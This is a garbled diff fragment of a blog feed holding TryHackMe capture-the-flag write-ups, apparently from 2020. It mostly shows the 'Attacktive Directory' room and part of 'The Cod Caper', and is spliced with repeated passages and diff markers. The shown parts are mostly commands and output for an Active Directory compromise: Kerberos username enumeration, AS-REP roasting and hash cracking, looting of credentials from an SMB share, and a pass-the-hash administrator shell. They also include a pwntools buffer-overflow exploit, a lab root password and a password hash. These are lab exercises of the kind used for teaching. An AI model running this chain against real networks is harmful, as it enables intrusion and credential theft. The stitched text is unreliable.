+S-1-5-21-3591857110-2884097990-301047963-1033 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1034 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1035 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1036 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1037 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1038 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1039 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1040 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1041 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1042 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1043 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1044 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1045 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1046 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1047 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1048 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1049 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1050 *unknown*\*unknown* (8)
+
+ ================================================ 
+|    Getting printer info for spookysec.local    |
+ ================================================ 
+Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED
+
+
+enum4linux complete on Fri Apr 17 13:16:10 2020
+
+root@kali:~# &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We gathered a lot of data that gave us more idea about the targeted AD since our tool failed to gain any credentials or usernames we will do that the hard way {Bruteforcing}, the next tool we'll be using is very powerful created by &lt;strong&gt;Ronnie Flathers&lt;/strong&gt;, I would suggest checking the details about the tool on github, I'll leave the link at the end.&lt;/p&gt;&lt;blockquote&gt;Let's get some usernames!&lt;/blockquote&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# kerbrute userenum -d spookysec.local --dc spookysec.local userlist.txt -t 100
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&amp;lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (n/a) - 04/17/20 - Ronnie Flathers @ropnop
+
+2020/04/17 13:17:24 &amp;gt;  Using KDC(s):
+2020/04/17 13:17:24 &amp;gt;   spookysec.local:88
+
+2020/04/17 13:17:24 &amp;gt;  [+] VALID USERNAME:       james@spookysec.local
+2020/04/17 13:17:24 &amp;gt;  [+] VALID USERNAME:       svc-admin@spookysec.local
+2020/04/17 13:17:24 &amp;gt;  [+] VALID USERNAME:       James@spookysec.local
+2020/04/17 13:17:24 &amp;gt;  [+] VALID USERNAME:       robin@spookysec.local
+2020/04/17 13:17:24 &amp;gt;  [+] VALID USERNAME:       darkstar@spookysec.local
+2020/04/17 13:17:24 &amp;gt;  [+] VALID USERNAME:       administrator@spookysec.local
+2020/04/17 13:17:24 &amp;gt;  [+] VALID USERNAME:       backup@spookysec.local
+2020/04/17 13:17:24 &amp;gt;  [+] VALID USERNAME:       paradox@spookysec.local
+2020/04/17 13:17:25 &amp;gt;  [+] VALID USERNAME:       JAMES@spookysec.local
+2020/04/17 13:17:25 &amp;gt;  [+] VALID USERNAME:       Robin@spookysec.local
+2020/04/17 13:17:27 &amp;gt;  [+] VALID USERNAME:       Administrator@spookysec.local
+2020/04/17 13:17:29 &amp;gt;  [+] VALID USERNAME:       Darkstar@spookysec.local
+2020/04/17 13:17:30 &amp;gt;  [+] VALID USERNAME:       Paradox@spookysec.local
+2020/04/17 13:17:33 &amp;gt;  [+] VALID USERNAME:       DARKSTAR@spookysec.local
+2020/04/17 13:17:34 &amp;gt;  [+] VALID USERNAME:       ori@spookysec.local
+2020/04/17 13:17:35 &amp;gt;  [+] VALID USERNAME:       ROBIN@spookysec.local
+2020/04/17 13:17:44 &amp;gt;  Done! Tested 100000 usernames (16 valid) in 20.383 seconds
+root@kali:~# &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The next step we will use GetNPUsers.py from Impacket to retrieve kerberos ticket and try to decrypt it.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# find / -type f -name 'GetNPUsers.py'
+/usr/share/doc/python3-impacket/examples/GetNPUsers.py
+root@kali:~# python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py spookysec.local/svc-admin -no-pass
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+[*] Getting TGT for svc-admin
+$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx03300355dc7659423fe0e31a657e0b4c0b7e5b01803004807927ddaa362d14f16fa0f994cdafa7c6bae1ad9ffe50b362391fb16760cfa776f25a9c3b9edbd9784e68275d1d7e39d83688a78653c58d41622695800187dbbc87dd923e1e7eaf70a6a25bb0eabee8656ee3873d5be19e6e2b5a6f858a761a66b385f606d7fbb3e557d222d991fbd3a0fec7ce29db064500576c48881a9f4793259f3fbb8c79bd3dc8de6cd92fe64d30ea6e9e299d5335f115e201c1d9d7f7ec81c5d5663b926ee17c61ac742247762eca95393af92a57b07dbfcf5e8b5d45b1058d4ca2ac879556025d3247630cc43c033b7f672c8fe
+root@kali:~#&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-code-card"&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# john kerbhash --wordlist=/root/passwordlist.txt 
+Created directory: /root/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+mxxxxxxxxxxxxx   ($krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL)
+1g 0:00:00:00 DONE (2020-04-17 13:20) 33.33g/s 221866p/s 221866c/s 221866C/s horoscope..amy123
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+root@kali:~#&lt;/code&gt;&lt;/pre&gt;&lt;figcaption&gt;The password list and users are available in the challenge room&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;after getting the credentials of svc-admin, we'll move on checking the shared file with the user and look for anything that we can use, listing the files show us a backup file, that backup file after downloading it will contain an encoded base64, decoding it will give us back another user credentials.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# smbmap -H spookysec.local -d spookysec.local -u svc-admin -p mxxxxxxxxxxxxx
+[+] Finding open SMB ports....
+[+] User SMB session established on spookysec.local...
+[+] IP: spookysec.local:445     Name: unknown                                           
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        .                                                  
+        dr--r--r--                0 Sat Apr  4 19:08:39 2020    .
+        dr--r--r--                0 Sat Apr  4 19:08:39 2020    ..
+        fr--r--r--               48 Sat Apr  4 19:08:53 2020    backup_credentials.txt
+        backup                                                  READ ONLY
+        C$                                                      NO ACCESS       Default share
+        .                                                  
+        fr--r--r--                3 Mon Jan  1 00:00:00 1601    InitShutdown
+        fr--r--r--                4 Mon Jan  1 00:00:00 1601    lsass
+        fr--r--r--                3 Mon Jan  1 00:00:00 1601    ntsvcs
+        fr--r--r--                3 Mon Jan  1 00:00:00 1601    scerpc
+        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-3e8-0
+        fr--r--r--                3 Mon Jan  1 00:00:00 1601    epmapper
+        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-290-0
+        fr--r--r--                3 Mon Jan  1 00:00:00 1601    LSM_API_service
+        fr--r--r--                3 Mon Jan  1 00:00:00 1601    eventlog
+        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-428-0
+        fr--r--r--                3 Mon Jan  1 00:00:00 1601    TermSrv_API_service
+        fr--r--r--                3 Mon Jan  1 00:00:00 1601    Ctx_WinStation_API_service
+        fr--r--r--                4 Mon Jan  1 00:00:00 1601    wkssvc
+        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-30c-0
+        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-30c-1
+        fr--r--r--                3 Mon Jan  1 00:00:00 1601    SessEnvPublicRpc
+        fr--r--r--                3 Mon Jan  1 00:00:00 1601    atsvc
+        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-3b8-0
+        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-710-0
+        fr--r--r--                3 Mon Jan  1 00:00:00 1601    RpcProxy\49671
+        fr--r--r--                3 Mon Jan  1 00:00:00 1601    72bba0c63ba338fa
+        fr--r--r--                3 Mon Jan  1 00:00:00 1601    RpcProxy\593
+        fr--r--r--                4 Mon Jan  1 00:00:00 1601    srvsvc
+        fr--r--r--                3 Mon Jan  1 00:00:00 1601    spoolss
+        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-880-0
+        fr--r--r--                3 Mon Jan  1 00:00:00 1601    netdfs
+        fr--r--r--                3 Mon Jan  1 00:00:00 1601    W32TIME_ALT
+        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-2fc-0
+        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-9d8-0
+        fr--r--r--                1 Mon Jan  1 00:00:00 1601    PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
+        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-97c-0
+        IPC$                                                    READ ONLY       Remote IPC
+        .                                                  
+        dr--r--r--                0 Sat Apr  4 18:39:35 2020    .
+        dr--r--r--                0 Sat Apr  4 18:39:35 2020    ..
+        NETLOGON                                                READ ONLY       Logon server share 
+        .                                                  
+        dr--r--r--                0 Sat Apr  4 18:39:35 2020    .
+        dr--r--r--                0 Sat Apr  4 18:39:35 2020    ..
+        dr--r--r--                0 Sat Apr  4 18:39:35 2020    spookysec.local
+        SYSVOL                                                  READ ONLY       Logon server share 
+root@kali:~#&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;msf5 auxiliary(admin/smb/download_file) &amp;gt; show options 
+
+Module options (auxiliary/admin/smb/download_file):
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   FILE_RPATHS                   no        A file containing a list remote files relative to the share to operate on
+   RHOSTS       spookysec.local  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&amp;lt;path&amp;gt;'
+   RPATH        backup_credentials.txt       no        The name of the remote file relative to the share to operate on
+   RPORT        445              yes       The SMB service port (TCP)
+   SMBDomain    spookysec.local  no        The Windows domain to use for authentication
+   SMBPass      mxxxxxxxxxxxxx   no        The password for the specified username
+   SMBSHARE     backup           yes       The name of a share on the RHOST
+   SMBUser      svc-admin        no        The username to authenticate as
+   THREADS      1                yes       The number of concurrent threads (max one per host)
+
+msf5 auxiliary(admin/smb/download_file) &amp;gt; run
+
+[+] 10.10.237.175:445     - backup_credentials.txt saved as: /root/.msf4/loot/20200417133840_default_10.10.237.175_smb.shares.file_838056.txt
+[*] spookysec.local:445   - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf5 auxiliary(admin/smb/download_file) &amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;with the password of backup user we can dump domain controller users hashes&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/screenshot.png" class="kg-image" alt="Attacktive Directory | THM write-up"&gt;&lt;/figure&gt;&lt;p&gt;the next step we can either decrypt the NTLM hash and connect to Administrator, or use the beautiful piece of code evil-winrm, feel free to check the Github repository and read more about how the tool works, Links at the end of the article.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# git clone https://github.com/Hackplayers/evil-winrm.git
+Cloning into 'evil-winrm'...
+remote: Enumerating objects: 72, done.
+remote: Counting objects: 100% (72/72), done.
+remote: Compressing objects: 100% (58/58), done.
+remote: Total 772 (delta 38), reused 32 (delta 14), pack-reused 700
+Receiving objects: 100% (772/772), 1.92 MiB | 1.87 MiB/s, done.
+Resolving deltas: 100% (443/443), done.
+root@kali:~# gem install evil-winrm
+Fetching: builder-3.2.4.gem (100%)
+Successfully installed builder-3.2.4
+Fetching: erubi-1.9.0.gem (100%)
+Successfully installed erubi-1.9.0
+Fetching: gssapi-1.3.0.gem (100%)
+Successfully installed gssapi-1.3.0
+Fetching: gyoku-1.3.1.gem (100%)
+Successfully installed gyoku-1.3.1
+Fetching: httpclient-2.8.3.gem (100%)
+Successfully installed httpclient-2.8.3
+Fetching: multi_json-1.14.1.gem (100%)
+Successfully installed multi_json-1.14.1
+Fetching: little-plugger-1.1.4.gem (100%)
+Successfully installed little-plugger-1.1.4
+Fetching: logging-2.2.2.gem (100%)
+Successfully installed logging-2.2.2
+Fetching: nori-2.6.0.gem (100%)
+Successfully installed nori-2.6.0
+Fetching: rubyntlm-0.6.2.gem (100%)
+Successfully installed rubyntlm-0.6.2
+Fetching: winrm-2.3.4.gem (100%)
+Successfully installed winrm-2.3.4
+Fetching: winrm-fs-1.3.4.gem (100%)
+Successfully installed winrm-fs-1.3.4
+Fetching: stringio-0.1.0.gem (100%)
+Building native extensions. This could take a while...
+Successfully installed stringio-0.1.0
+Fetching: evil-winrm-2.3.gem (100%)
+Happy hacking! :)
+Successfully installed evil-winrm-2.3
+Parsing documentation for builder-3.2.4
+Installing ri documentation for builder-3.2.4
+Parsing documentation for erubi-1.9.0
+Installing ri documentation for erubi-1.9.0
+Parsing documentation for gssapi-1.3.0
+Installing ri documentation for gssapi-1.3.0
+Parsing documentation for gyoku-1.3.1
+Installing ri documentation for gyoku-1.3.1
+Parsing documentation for httpclient-2.8.3
+Installing ri documentation for httpclient-2.8.3
+Parsing documentation for multi_json-1.14.1
+Installing ri documentation for multi_json-1.14.1
+Parsing documentation for little-plugger-1.1.4
+Installing ri documentation for little-plugger-1.1.4
+Parsing documentation for logging-2.2.2
+Installing ri documentation for logging-2.2.2
+Parsing documentation for nori-2.6.0
+Installing ri documentation for nori-2.6.0
+Parsing documentation for rubyntlm-0.6.2
+Installing ri documentation for rubyntlm-0.6.2
+Parsing documentation for winrm-2.3.4
+Installing ri documentation for winrm-2.3.4
+Parsing documentation for winrm-fs-1.3.4
+Installing ri documentation for winrm-fs-1.3.4
+Parsing documentation for stringio-0.1.0
+Installing ri documentation for stringio-0.1.0
+Parsing documentation for evil-winrm-2.3
+Installing ri documentation for evil-winrm-2.3
+Done installing documentation for builder, erubi, gssapi, gyoku, httpclient, multi_json, little-plugger, logging, nori, rubyntlm, winrm, winrm-fs, stringio, evil-winrm after 6 seconds
+14 gems installed
+root@kali:~#&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# evil-winrm -i 10.10.237.175 -u Administrator -H e48xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents&amp;gt; whoami
+thm-ad\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And here we go Administrator user, there isn't much we can't do now ... &lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/8EmeieJAGjvUI" width="480" height="360" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/work-homer-simpson-8EmeieJAGjvUI"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;Happy Hacking!&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://github.com/ropnop/kerbrute"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;ropnop/kerbrute&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;A tool to perform Kerberos pre-auth bruteforcing. Contribute to ropnop/kerbrute development by creating an account on GitHub.&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;img class="kg-bookmark-icon" src="https://github.githubassets.com/favicons/favicon.svg" alt="Attacktive Directory | THM write-up"&gt;&lt;span class="kg-bookmark-author"&gt;ropnop&lt;/span&gt;&lt;span class="kg-bookmark-publisher"&gt;GitHub&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://avatars2.githubusercontent.com/u/2555506?s=400&amp;amp;v=4" alt="Attacktive Directory | THM write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://github.com/Hackplayers/evil-winrm"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;Hackplayers/evil-winrm&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;The ultimate WinRM shell for hacking/pentesting. Contribute to Hackplayers/evil-winrm development by creating an account on GitHub.&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;img class="kg-bookmark-icon" src="https://github.githubassets.com/favicons/favicon.svg" alt="Attacktive Directory | THM write-up"&gt;&lt;span class="kg-bookmark-author"&gt;Hackplayers&lt;/span&gt;&lt;span class="kg-bookmark-publisher"&gt;GitHub&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://repository-images.githubusercontent.com/189010173/9da36880-c2d7-11e9-8037-2feff48b35d9" alt="Attacktive Directory | THM write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://github.com/SecureAuthCorp/impacket"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;SecureAuthCorp/impacket&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;Impacket is a collection of Python classes for working with network protocols. - SecureAuthCorp/impacket&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;img class="kg-bookmark-icon" src="https://github.githubassets.com/favicons/favicon.svg" alt="Attacktive Directory | THM write-up"&gt;&lt;span class="kg-bookmark-author"&gt;SecureAuthCorp&lt;/span&gt;&lt;span class="kg-bookmark-publisher"&gt;GitHub&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://avatars2.githubusercontent.com/u/9470173?s=400&amp;amp;v=4" alt="Attacktive Directory | THM write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://tryhackme.com/room/attacktivedirectory"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;TryHackMe | Attacktive Directory&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;img class="kg-bookmark-icon" src="https://tryhackme.com/img/favicon.png" alt="Attacktive Directory | THM write-up"&gt;&lt;span class="kg-bookmark-publisher"&gt;TryHackMe&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://tryhackme-images.s3.amazonaws.com/room-icons/62d83f3931e968e92e06138a72ce44f0.png" alt="Attacktive Directory | THM write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;</content:encoded></item><item><title>thecodcaper CTF | write-up</title><description>&lt;p&gt;Hello everyone, today's CTF is so impressive, not rated yet but from my little experience I can tell there's no easy or hard challenge, it's all about how out-of-the-box can you think. but no worries this one does have hints and the techniques are provided with the questioner. anyways! hope&lt;/p&gt;</description><link>http://localhost:2368/thecodca/</link><guid isPermaLink="false">5e90424a5e61514e230adc77</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Tue, 14 Apr 2020 18:52:00 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/pgn.png" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/pgn.png" alt="thecodcaper CTF | write-up"&gt;&lt;p&gt;Hello everyone, today's CTF is so impressive, not rated yet but from my little experience I can tell there's no easy or hard challenge, it's all about how out-of-the-box can you think. but no worries this one does have hints and the techniques are provided with the questioner. anyways! hope you guys enjoy this write-up, Let's enumerate machine!&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/jVZmRHItLSlGE1SYBV" width="480" height="273" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/cbs-306-seal306-seal-team-jVZmRHItLSlGE1SYBV"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sV -sC 10.10.201.143
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-10 09:50 UTC
 Nmap scan report for ip-10-10-201-143.eu-west-1.compute.internal (10.10.201.143)
 Host is up (0.0018s latency).
@@ -135,7 +753,7 @@ su root
 Password: love2fish
 
 root@ubuntu:/opt/secret#id
-uid=0(root) gid=0(root) groups=0(root)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Pwntools is a python library dedicated to making everything we just did in the last task much simpler. However, since it is a library, it requires python knowledge to use to it's full potential, and as such everything in this task will be done using a python script.&lt;br&gt;We start off the script with:&lt;/p&gt;&lt;p&gt;&lt;code&gt;from pwn import *&lt;/code&gt;&lt;br&gt;&lt;code&gt;proc = process('/opt/secret/root')&lt;/code&gt;&lt;/p&gt;&lt;p&gt;This imports all the utilities from the pwntools library so we can use them in our script, and then creates a process that we can interact with using pwntools functions.&lt;/p&gt;&lt;p&gt;We know that we need the memory address of the shell function, and pwntools provides a way to obtain that with ELF(). ELF allows us to get various memory addresses of important points in our binary, including the memory address of the shell function.&lt;br&gt;With the ELF addition our script becomes&lt;br&gt;&lt;code&gt;from pwn import *&lt;/code&gt;&lt;br&gt;&lt;code&gt;proc = process('/opt/secret/root')&lt;/code&gt;&lt;br&gt;&lt;code&gt;elf = ELF('/opt/secret/root')&lt;/code&gt;&lt;br&gt;&lt;code&gt;shell_func = elf.symbols.shell&lt;/code&gt;&lt;br&gt;shell_func holds the memory address of our shell function. Now we need a way to form the payload, luckily pwntools has that to with fit().&lt;/p&gt;&lt;p&gt;fit allows us to form a payload by combining characters and our memory address. To send the payload we can use a method in our &lt;code&gt;proc&lt;/code&gt; variable, proc.sendline(), which just sends whatever data we want to the binary. Finally we can use proc.interactive(), to view the full output of the process.&lt;br&gt;With all that our final exploit script becomes&lt;br&gt;&lt;code&gt;from pwn import *&lt;/code&gt;&lt;br&gt;&lt;code&gt;proc = process('/opt/secret/root')&lt;/code&gt;&lt;br&gt;&lt;code&gt;elf = ELF('/opt/secret/root')&lt;/code&gt;&lt;br&gt;&lt;code&gt;shell_func = elf.symbols.shell&lt;/code&gt;&lt;br&gt;&lt;code&gt;payload = fit({&lt;/code&gt;&lt;br&gt;&lt;code&gt;44: shell_func # this adds the value of shell_func after 44 characters&lt;/code&gt;&lt;br&gt;&lt;code&gt;})&lt;/code&gt;&lt;br&gt;&lt;code&gt;proc.sendline(payload)&lt;/code&gt;&lt;br&gt;&lt;code&gt;proc.interactive()&lt;/code&gt;&lt;br&gt;Save that to a .py file and run it, and you should get this output:&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-14-at-19.38.53.png" class="kg-image" alt="thecodcaper CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;Now that we have the password hashes, we can crack them and get the root password! Recall from the previous outputs that our root password hash is &lt;code&gt;$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.&lt;/code&gt;&lt;strong&gt;"&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Happy hacking!&lt;/p&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://tryhackme.com/room/thecodcaper"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;TryHackMe | The Cod Caper&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;A guided room taking you through infiltrating and exploiting a Linux system.&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;img class="kg-bookmark-icon" src="https://tryhackme.com/img/favicon.png" alt="thecodcaper CTF | write-up"&gt;&lt;span class="kg-bookmark-publisher"&gt;TryHackMe&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://tryhackme-images.s3.amazonaws.com/room-icons/282c55307eada4ad18a0b06e4d65ff34.jpeg" alt="thecodcaper CTF | write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://tryhackme.com"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;TryHackMe | Hacking Training&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;An online platform for learning and teaching cyber security, all through your browser.&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;img class="kg-bookmark-icon" src="https://tryhackme.com/img/favicon.png" alt="thecodcaper CTF | write-up"&gt;&lt;span class="kg-bookmark-publisher"&gt;TryHackMe&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://tryhackme.com/img/favicon.png" alt="thecodcaper CTF | write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/O5GKT0UDGyQLu" width="480" height="271" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/penguins-O5GKT0UDGyQLu"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;</content:encoded></item><item><title>bebop | drone lovers CTF</title><description>&lt;p&gt;Hello everyone, Today's CTF is available at &lt;strong&gt;www.Tryhackme.com&lt;/strong&gt; rated as an easy challenge so it won't be hard for someone just starting in the field, the concept is based on the Parrot Bebop drone and brings a huge inspiration of the memory of the DEFCON 23 speech "Knocking&lt;/p&gt;</description><link>http://localhost:2368/bebop-drone-lovers-ctf/</link><guid isPermaLink="false">5e949d57e69fa94385575c33</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Mon, 13 Apr 2020 17:23:33 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/Dr63yPm.png" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/Dr63yPm.png" alt="bebop | drone lovers CTF"&gt;&lt;p&gt;Hello everyone, Today's CTF is available at &lt;strong&gt;www.Tryhackme.com&lt;/strong&gt; rated as an easy challenge so it won't be hard for someone just starting in the field, the concept is based on the Parrot Bebop drone and brings a huge inspiration of the memory of the DEFCON 23 speech "Knocking my neighbour's kids cruddy drone offline", feel free to give it a check, the talk carries a lot of good information.&lt;/p&gt;&lt;figure class="kg-card kg-embed-card"&gt;&lt;iframe width="480" height="270" src="https://www.youtube.com/embed/5CzURm7OpAA?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen&gt;&lt;/iframe&gt;&lt;/figure&gt;&lt;blockquote&gt;Let's start with some enumeration&lt;/blockquote&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.116.147
+uid=0(root) gid=0(root) groups=0(root)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Pwntools is a python library dedicated to making everything we just did in the last task much simpler. However, since it is a library, it requires python knowledge to use to it's full potential, and as such everything in this task will be done using a python script.&lt;br&gt;We start off the script with:&lt;/p&gt;&lt;p&gt;&lt;code&gt;from pwn import *&lt;/code&gt;&lt;br&gt;&lt;code&gt;proc = process('/opt/secret/root')&lt;/code&gt;&lt;/p&gt;&lt;p&gt;This imports all the utilities from the pwntools library so we can use them in our script, and then creates a process that we can interact with using pwntools functions.&lt;/p&gt;&lt;p&gt;We know that we need the memory address of the shell function, and pwntools provides a way to obtain that with ELF(). ELF allows us to get various memory addresses of important points in our binary, including the memory address of the shell function.&lt;br&gt;With the ELF addition our script becomes&lt;br&gt;&lt;code&gt;from pwn import *&lt;/code&gt;&lt;br&gt;&lt;code&gt;proc = process('/opt/secret/root')&lt;/code&gt;&lt;br&gt;&lt;code&gt;elf = 